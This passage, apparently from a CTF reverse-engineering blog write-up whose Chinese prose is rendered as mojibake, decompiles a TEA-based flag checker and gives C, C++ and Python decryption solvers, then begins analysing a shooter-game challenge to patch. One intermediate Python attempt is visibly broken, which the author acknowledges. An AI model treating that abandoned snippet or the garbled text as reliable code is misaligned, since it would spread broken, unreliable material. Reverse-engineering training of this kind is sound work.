class="number">32</span>è½®çš„å’Œä¹Ÿè¦ä¾æ¬¡é€’å‡æ¥è¿›è¡Œè§£å¯†</span><br><span class="line">æ‰€ä»¥è§£å¯†ç®—æ³•å¦‚ä¸‹</span><br></pre></td></tr></table></figure><ul><li>å…¶ä¸­ç”¨äº†å¼‚æˆ–çš„ä¸€ä¸ªé‡è¦ç‰¹æ€§ï¼šc&#x3D;a^bï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¸€ç›´cæ±‚aä¸€æ ·çš„ a&#x3D;c^bã€‚åæ­£é€†å‘ç›´æ¥æŠ„</li></ul><p>ç®—æ³•å¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">Decrypt</span><span class="params">(<span class="type">long</span>* EntryData, <span class="type">long</span>* Key)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//åˆ†åˆ«åŠ å¯†æ•°ç»„ä¸­çš„å‰å››ä¸ªå­—èŠ‚ä¸å4ä¸ªå­—èŠ‚,4ä¸ªå­—èŠ‚ä¸ºä¸€ç»„æ¯æ¬¡åŠ å¯†ä¸¤ç»„</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> x = EntryData[<span class="number">0</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> y = EntryData[<span class="number">1</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> delta = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    sum = delta &lt;&lt; <span class="number">5</span>;   <span class="comment">//æ³¨æ„è¿™é‡Œ,sum = 32è½®ä¹‹åçš„é»„é‡‘åˆ†å‰²å€¼. å› ä¸ºæˆ‘ä»¬è¦ååºè§£å¯†.    deltaå·¦ç§»äº”ä½å°±æ˜¯Ã—32</span></span><br><span class="line">    <span class="comment">//æ€»å…±åŠ å¯†32è½® é‚£ä¹ˆååºä¹Ÿè§£å¯†32è½®</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// å…ˆå°†yè§£å¼€ ç„¶åå‚ä¸è¿ç®—åœ¨è§£x</span></span><br><span class="line">        y -= ((x &lt;&lt; <span class="number">4</span>) + Key[<span class="number">2</span>]) ^ (x + sum) ^ ((x &gt;&gt; <span class="number">5</span>) + Key[<span class="number">3</span>]);</span><br><span class="line">        x -= ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + sum) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span class="number">1</span>]);</span><br><span class="line">        sum -= delta;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//æœ€ååŠ å¯†çš„ç»“æœé‡æ–°å†™å…¥åˆ°æ•°ç»„ä¸­</span></span><br><span class="line">    EntryData[<span class="number">0</span>] = x;</span><br><span class="line">    EntryData[<span class="number">1</span>] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><ul><li>F5</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _DWORD Str[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5[<span class="number">8</span>]; <span class="comment">// [rsp+40h] [rbp-40h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6[<span class="number">6</span>]; <span class="comment">// [rsp+60h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+7Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  v6[<span class="number">0</span>] = <span class="number">429459223</span>;     <span class="number">32</span>ä½  -&gt;  v6 : <span class="number">32</span>*<span class="number">4</span>=<span class="number">128</span>ä½  -&gt;   å¯†é’¥</span><br><span class="line">  v6[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">  v6[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">  v6[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line">  v5[<span class="number">0</span>] = <span class="number">-999025570</span>;    </span><br><span class="line">  v5[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">  v5[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">  v5[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">  v5[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">  v5[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input the flag: \\n&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>((<span class="type">const</span> <span class="type">char</span> *)Str) == <span class="number">24</span> )&#123;             </span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )&#123;</span><br><span class="line">      encrypt(&amp;Str[i], v6);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">5</span>; ++j )&#123;</span><br><span class="line">      <span class="keyword">if</span> ( Str[j] != v5[j] )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it&#x27;s not my teapot!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Oh my god, you made it?!&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the length is NSFW~~~&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>strlen((const char *)Str) == 24</code> è¯´æ˜flagæ˜¯24ä½</li></ul><p>å…³é”®åº”è¯¥æ˜¯encrptå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">encrypt</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *a1, <span class="type">unsigned</span> <span class="type">int</span> *a2)</span>  <span class="comment">//encrypt(&amp;Str[i], v6);</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = *a1;    <span class="comment">//v6=a1=&amp;str[i]</span></span><br><span class="line">  v5 = a1[<span class="number">1</span>];  <span class="comment">//v5=str[i+1]</span></span><br><span class="line">  v4 = <span class="number">0</span>;     </span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0x1F</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v6 += (((v5 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v5)) + v5) ^ (a2[v4 &amp; <span class="number">3</span>] + v4);</span><br><span class="line">    v4 += <span class="number">289739793</span>;</span><br><span class="line">    v5 += (((v6 &gt;&gt; <span class="number">5</span>) ^ (<span class="number">16</span> * v6)) + v6) ^ (a2[(v4 &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + v4);</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = v6;</span><br><span class="line">  result = v5;</span><br><span class="line">  a1[<span class="number">1</span>] = v5;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æŸ¥äº†ä¸€ä¸‹ï¼ˆçœ‹å‡ºé¢˜äººè§£é‡Šï¼Œå‘ç°å°±æ˜¯TeaåŠ å¯†ã€‚</p><p><img src="https://prod-files-secure.s3.us-west-2.amazonaws.com/03429e4a-3c7a-4ca3-8fc0-5d18c145b2bd/70499637-9bf5-4853-b8e3-b858ae695a97/Untitled.png" alt="Untitled"></p><p>å…ˆå¤„ç†<code>main()</code>å‡½æ•°é€†å‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():&#123;</span><br><span class="line">    Str = [<span class="number">0</span>] * <span class="number">6</span>    <span class="comment"># ä¸€ç»„é•¿åº¦ä½4</span></span><br><span class="line">    key = [<span class="number">429459223</span>, <span class="number">537200643</span>, <span class="number">537462290</span>, <span class="number">537006083</span>]</span><br><span class="line">    res = [<span class="number">0xC474145E</span>, <span class="number">0x39D42171</span>, <span class="number">0xF527A9EB</span>, <span class="number">0xE32AB90A</span>, <span class="number">0x3F5BD7F7</span>, <span class="number">0xD673678C</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">          decrypt(res[i:i+<span class="number">1</span>], key)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br><span class="line">res_array = <span class="built_in">bytearray</span>()</span><br><span class="line"><span class="keyword">for</span> hex_res <span class="keyword">in</span> res:</span><br><span class="line">    res_array += hex_res.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res_array )</span><br></pre></td></tr></table></figure><p>å†å¤„ç†<code>decrypt()</code>å‡½æ•°é€†å‘</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">res, key</span>): </span><br><span class="line">  x = res[<span class="number">0</span>]</span><br><span class="line">  y = res[<span class="number">1</span>]</span><br><span class="line">  </span><br><span class="line">delta = <span class="number">0x114514</span></span><br><span class="line">  z = delta &lt;&lt; <span class="number">4</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">y -= (((x &gt;&gt; <span class="number">5</span>) ^ (x &lt;&lt; <span class="number">4</span>)) + x) ^ (key[(z &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + z)  <span class="comment">#æ³¨æ„å…ˆè§£y</span></span><br><span class="line">z -= delda</span><br><span class="line">    x -= (((y &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">4</span>)) + y) ^ (key[z &amp; <span class="number">3</span>] + z)</span><br><span class="line">  Flag[<span class="number">0</span>] = x</span><br><span class="line">  Flag[<span class="number">1</span>] = y</span><br></pre></td></tr></table></figure><p>æ”¾å¼ƒpythonäº†ã€‚åˆ†ç»„åŠ å¯†è¿˜æ˜¯ç”¨æ•°æ®ç±»å‹å¼ºçš„è¯­è¨€å§ï¼Œè€Œä¸”æˆ‘ä¹Ÿä¸ç†Ÿç»ƒã€‚å°±ç”¨cpp</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdint&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">decrypt</span><span class="params">(<span class="type">int32_t</span>* v, <span class="type">uint32_t</span>* key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> v0 = v[<span class="number">0</span>], v1 = v[<span class="number">1</span>];</span><br><span class="line"><span class="type">uint32_t</span> delta = <span class="number">289739793</span>;</span><br><span class="line"><span class="type">uint32_t</span> sum = delta &lt;&lt; <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">sum -= delta;</span><br><span class="line">v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">v[<span class="number">0</span>] = v0;</span><br><span class="line">v[<span class="number">1</span>] = v1;</span><br><span class="line">  <span class="comment">//printf(&quot; %d %d----&quot;,v[0],v[1]);</span></span><br><span class="line"><span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">uint32_t</span> key[<span class="number">4</span>];</span><br><span class="line">key[<span class="number">0</span>] = <span class="number">429459223</span>;</span><br><span class="line">key[<span class="number">1</span>] = <span class="number">537200643</span>;</span><br><span class="line">key[<span class="number">2</span>] = <span class="number">537462290</span>;</span><br><span class="line">key[<span class="number">3</span>] = <span class="number">537006083</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int32_t</span> enc[<span class="number">12</span>];</span><br><span class="line">    enc[<span class="number">0</span>] = <span class="number">-999025570</span>;</span><br><span class="line">    enc[<span class="number">1</span>] = <span class="number">970203505</span>;</span><br><span class="line">    enc[<span class="number">2</span>] = <span class="number">-181949973</span>;</span><br><span class="line">    enc[<span class="number">3</span>] = <span class="number">-483739382</span>;</span><br><span class="line">    enc[<span class="number">4</span>] = <span class="number">1062983671</span>;</span><br><span class="line">    enc[<span class="number">5</span>] = <span class="number">-697079924</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line"><span class="built_in">decrypt</span>(&amp;enc[i], key);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= <span class="number">5</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, enc[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF00</span>) &gt;&gt; <span class="number">8</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF0000</span>) &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (enc[i] &amp; <span class="number">0xFF000000</span>) &gt;&gt; <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">&#x27;\\n&#x27;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ç»ˆäºpythonè°ƒè¯•å‡ºæ¥ï¼Œpythonå‡½æ•°ä¹Ÿéœ€è¦<code>return</code>ï¼Œå…¶æ¬¡<code>&amp; 0XFFFFFFFF</code> æ³¨æ„ä½¿ç”¨è§„èŒƒ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">res, key</span>):</span><br><span class="line">    x, y = res[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFF</span>, res[<span class="number">1</span>] &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    delta = <span class="number">289739793</span></span><br><span class="line">    z = delta * <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        y -= (((x &lt;&lt; <span class="number">4</span>) ^ (x &gt;&gt; <span class="number">5</span>)) + x) ^ (key[(z &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>] + z)</span><br><span class="line">        y = y &amp; <span class="number">0xFFFFFFFF</span>         <span class="comment">#è¿™é‡Œå¾ˆé‡è¦ï¼</span></span><br><span class="line">        z -= delta</span><br><span class="line">        z = z &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= (((y &lt;&lt; <span class="number">4</span>) ^ (y &gt;&gt; <span class="number">5</span>)) + y) ^ (key[z &amp; <span class="number">3</span>] + z)</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line">    res[<span class="number">0</span>], res[<span class="number">1</span>] = x, y</span><br><span class="line">    <span class="comment">#print(res[0], &#x27;   &#x27;, res[1])</span></span><br><span class="line">    <span class="keyword">return</span> res[<span class="number">0</span>],res[<span class="number">1</span>]     <span class="comment"># ä¸€æ¬¡æ€§returnä¸¤ä¸ªå‡ºå»</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = [<span class="number">0x19990717</span>, <span class="number">0x20050803</span>, <span class="number">0x20090612</span>, <span class="number">0x20021003</span>]</span><br><span class="line">    res = [<span class="number">0xC474145E</span>, <span class="number">0x39D42171</span>, <span class="number">0xF527A9EB</span>, <span class="number">0xE32AB90A</span>, <span class="number">0x3F5BD7F7</span>, <span class="number">0xD673678C</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        res[i],res[i+<span class="number">1</span>] = decrypt(res[i:], key)</span><br><span class="line"></span><br><span class="line">    decrypted_string = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">chr</span>((res[i] &gt;&gt; j) &amp; <span class="number">0xFF</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">32</span>, <span class="number">8</span>)])</span><br><span class="line">    <span class="built_in">print</span>(decrypted_string)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h4 id="å¤ç›˜"><a href="#å¤ç›˜" class="headerlink" title="å¤ç›˜"></a>å¤ç›˜</h4><ul><li>è‡ªæˆ‘æ„Ÿè§‰ç”¨pythonå‘çš„åœ°æ–¹åœ¨åå…­è¿›åˆ¶æ•°æ®è½¬æ¢ä¸ºå­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œè¿˜æœ‰åˆ†ç»„è¿ç®—çš„æº¢å‡ºé—®é¢˜</li><li>ç”¨cppå†™ï¼Œè½¬ä¸è½¬æ¢æˆæ— ç¬¦å·æ•´æ•°éƒ½ä¸å½±å“ï¼Œç”¨ä¸ç”¨åå…­è¿›åˆ¶è¡¨ç¤ºæ•°å­—ä¹Ÿä¸å½±å“ï¼Œæ¯”è¾ƒæ–¹ä¾¿å§</li></ul><h3 id="âœˆï¸-EASY-æ‰“é£æœºé«˜æ‰‹"><a href="#âœˆï¸-EASY-æ‰“é£æœºé«˜æ‰‹" class="headerlink" title="âœˆï¸[EASY] æ‰“é£æœºé«˜æ‰‹"></a>âœˆï¸[EASY] æ‰“é£æœºé«˜æ‰‹</h3><h4 id="è€ƒç‚¹-1"><a href="#è€ƒç‚¹-1" class="headerlink" title="è€ƒç‚¹"></a>è€ƒç‚¹</h4><ul><li>ï¼ˆåŠ¨æ€è°ƒè¯•ï¼‰</li><li>patch</li><li>æœºå™¨ç å’Œæ±‡ç¼–è½¬æ¢</li></ul><h4 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h4><ul><li>F5</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  Startup();</span><br><span class="line">  <span class="keyword">while</span> ( IsOver )</span><br><span class="line">  &#123;</span><br><span class="line">    UpdateInput();</span><br><span class="line">    UpdateNormal();</span><br><span class="line">    Show();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\\t\\tYou Are so WEAK!\\n&quot;</span>);</span><br><span class="line">  Sleep(<span class="number">0x9C4</span>u);</span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Startup</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  IsOver = <span class="number">1</span>;</span><br><span class="line">  score = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">26</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">61</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( i &amp;&amp; i != <span class="number">26</span> &amp;&amp; j &amp;&amp; j != <span class="number">61</span> )</span><br><span class="line">        canvas[<span class="number">62</span> * i + j] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        canvas[<span class="number">62</span> * i + j] = <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  pos_h = <span class="number">12</span>;</span><br><span class="line">  pos_w = <span class="number">30</span>;</span><br><span class="line">  canvas[<span class="number">774</span>] = <span class="number">1</span>;</span><br><span class="line">  enemynum = <span class="number">3</span>;</span><br><span class="line">  v0 = time(<span class="number">0</span>i64);</span><br><span class="line">  srand(v0);</span><br><span class="line">  interval = <span class="number">4</span>;</span><br><span class="line">  itv_move = <span class="number">5</span>;</span><br><span class="line">  itv_new = <span class="number">40</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>å‘ç°é‡Œé¢çš„å‡½æ•°éƒ½éå¸¸å¤æ‚ï¼Œè€Œä¸”çœ‹ä¸æ‡‚ã€‚</li><li>è¯•ç€æ‰“å¼€exeå‘ç°å°±æ˜¯æ‰“é£æœºæ¸¸æˆï¼Œåº”è¯¥ä»£ç 